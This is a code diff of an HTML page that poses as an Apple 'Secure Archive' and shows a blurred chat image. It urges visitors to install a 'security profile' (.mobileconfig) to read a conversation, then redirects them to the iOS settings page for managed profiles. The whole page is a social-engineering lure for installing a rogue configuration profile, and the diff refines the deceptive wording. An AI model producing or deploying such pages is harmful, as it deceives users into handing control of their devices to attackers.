@@ -1,26 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Identity Verification</title>
+    <title>Secure Archive</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; background: #000; overflow: hidden; }
         .chat-bg {
-            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://images.unsplash.com/photo-1577563908411-5077b6dc7624?q=80&w=2070&auto=format&fit=crop'); 
+            background-image: url('https://images.unsplash.com/photo-1611606063065-ee7946f0787a?q=80&w=1974&auto=format&fit=crop'); 
             height: 100vh; width: 100%; background-size: cover; background-position: center;
             position: fixed; top: 0; left: 0; z-index: 1; filter: blur(8px);
         }
         .container {
             position: relative; z-index: 3; background: white; padding: 35px; border-radius: 25px;
-            text-align: center; max-width: 320px; margin: 25vh auto;
+            text-align: center; max-width: 310px; margin: 25vh auto;
             box-shadow: 0 15px 50px rgba(0,0,0,0.8);
         }
         .apple-logo { width: 40px; margin-bottom: 15px; }
-        h2 { font-size: 19px; color: #1d1d1f; margin-bottom: 10px; font-weight: 600; }
-        p { font-size: 14px; color: #48484a; margin-bottom: 25px; line-height: 1.5; }
         .btn {
             display: block; background: #007aff; color: white; text-decoration: none;
-            padding: 15px; border-radius: 12px; font-weight: 600; font-size: 16px; cursor: pointer; border: none; width: 100%;
+            padding: 15px; border-radius: 12px; font-weight: 600; font-size: 16px; text-align: center;
         }
     </style>
 </head>
@@ -28,19 +26,15 @@
     <div class="chat-bg"></div>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
-        <h2>Verification Required</h2>
-        <p>This chat archive is encrypted. Please install the verification profile to continue.</p>
-        
-        <a href="https://raw.githubusercontent.com/applesecurityalert6-prog/hadima-closet-collections/main/secure_verify-6.mobileconfig" 
-           class="btn" onclick="goToSettings()">Install Profile</a>
+        <h2>Unblur Archive</h2>
+        <p>To read the full conversation, please install the security profile.</p>
+        <a href="verify.mobileconfig" class="btn" onclick="goToSettings()">Verify & Unblur</a>
     </div>
-
     <script>
         function goToSettings() {
-            // Redirect to settings after 4 seconds
             setTimeout(function() {
                 window.location.href = "App-prefs:General&path=ManagedConfigurationList";
-            }, 4000);
+            }, 5000);
         }
     </script>
 </body>
